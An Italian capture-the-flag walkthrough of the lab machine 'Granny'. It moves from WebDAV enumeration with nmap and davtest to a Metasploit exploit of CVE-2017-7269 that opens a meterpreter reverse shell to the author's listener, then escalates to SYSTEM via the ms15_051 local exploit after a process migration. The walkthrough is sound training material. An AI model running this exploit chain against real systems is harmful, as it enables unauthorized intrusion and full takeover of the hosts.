---
title: "Granny Walkthrough"
description: "Granny, pur essendo simile a Grandpa, può essere sfruttata tramite diversi metodi. Il metodo previsto per risolvere questa macchina è la nota vulnerabilità di upload WebDAV."
author: dua2z3rr
date: 2025-09-19 2:00:00
categories: [Machines]
tags: ["Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Arbitrary File Upload", "Vulnerabilità: Misconfiguration", "Codice: ASP"]
image: /assets/img/granny/granny-resized.png"
---

## Enumerazione Esterna

### Nmap

Cominciamo, come sempre, con uno scan di nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap -p- -sV -sC -vv 10.10.10.15
<SNIP>
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Date: Fri, 19 Sep 2025 13:19:27 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  WebDAV type: Unknown
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Scopriamo una pagina http che utlizza **WebDAV**. Esploriamola.

### HTTP

![Desktop View](/assets/img/granny/granny-homepage.png)

Ci ritroviamo davanti a una pagina statica. Mentre cerchiamo vulnerabilità, facciamo partire un directory scan con **ffuf** con il comando:

```shell
ffuf -w /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.15:80/_private/FUZZ -ic -recursion
```

### Ricerca exploit

Utilizziamo il tool **davtest** per testare la applicazioni con webdav.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/boxes/granny]
└──╼ $davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: O4Uc3WR9
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_O4Uc3WR9
********************************************************
 Sending test files
PUT	cgi	FAIL
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.cfm
PUT	shtml	FAIL
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.txt
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.pl
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.jhtml
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.html
PUT	aspx	FAIL
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.php
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.jsp
PUT	asp	FAIL
********************************************************
 Checking for test file execution
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.txt
EXEC	txt	FAIL
EXEC	pl	FAIL
EXEC	jhtml	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.html
EXEC	html	FAIL
EXEC	php	FAIL
EXEC	jsp	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_O4Uc3WR9
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.cfm
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.txt
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.pl
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.jhtml
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.html
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.php
PUT File: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.jsp
Executes: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.txt
Executes: http://10.10.10.15/DavTestDir_O4Uc3WR9/davtest_O4Uc3WR9.html
```

Notiamo che con il metodo http **PUT** possiamo fare l'upload di file. Proviamo ad aprire uno dei file caricati tramite **testdav**.

![Desktop View](/assets/img/granny/granny-testdav-test.png)

Il file è stato caricato. Proviamo a utilizzare la vulnerabilità classificata come **CVE-2017-7269**.

```shell

[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
   RHOSTS         10.10.10.15      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.9       yes       The listen address (an interface may be specified)
   LPORT     9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> exploit
[*] Started reverse TCP handler on 10.10.16.9:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.16.9:4444 -> 10.10.10.15:1030) at 2025-09-19 16:42:00 +0200

(Meterpreter 1)(c:\windows\system32\inetsrv) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> use post/multi/recon/local_exploit_suggester
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set showdescription true
showdescription => true
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> exploit
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 205 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  A vulnerability within the Microsoft TCP/IP protocol driver 
  tcpip.sys can allow a local attacker to trigger a NULL pointer 
  dereference by using a specially crafted IOCTL. This flaw can be 
  abused to elevate privileges to SYSTEM.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 ```

Utilizzando il modulo `exploit/windows/local/ms15_051_client_copy_image` possiamo diventare admin. Però, prima di farlo, bisogna utilizzare il comando `migrate` di meterpreter per cambiare il servizio della shell.

```shell
(Meterpreter 1)(c:\windows\system32\inetsrv) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 736   392   svchost.exe
 752   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1256  1072  cidaemon.exe
 1364  392   VGAuthService.exe
 1416  392   vmtoolsd.exe
 1512  392   svchost.exe
 1608  392   svchost.exe
 1800  392   alg.exe
 1824  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1908  392   dllhost.exe
 2040  1072  cidaemon.exe
 2144  1072  cidaemon.exe
 2276  1512  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2344  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2392  2276  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2608  584   wmiprvse.exe
 3084  344   logon.scr

(Meterpreter 1)(c:\windows\system32\inetsrv) > migrate 1824
[*] Migrating from 2392 to 1824...
[*] Migration completed successfully.
```

Ora possiamo usare il modulo citato precedentemente.

```shell
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> exploit
[*] Started reverse TCP handler on 10.10.16.9:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 4024 launched.
[*] Reflectively injecting the DLL into 4024...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.16.9:4444 -> 10.10.10.15:1031) at 2025-09-19 17:01:29 +0200

(Meterpreter 2)(C:\WINDOWS\system32) > shell
Process 2064 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

Prendiamo sia la user che la root flag e terminiamo la box.
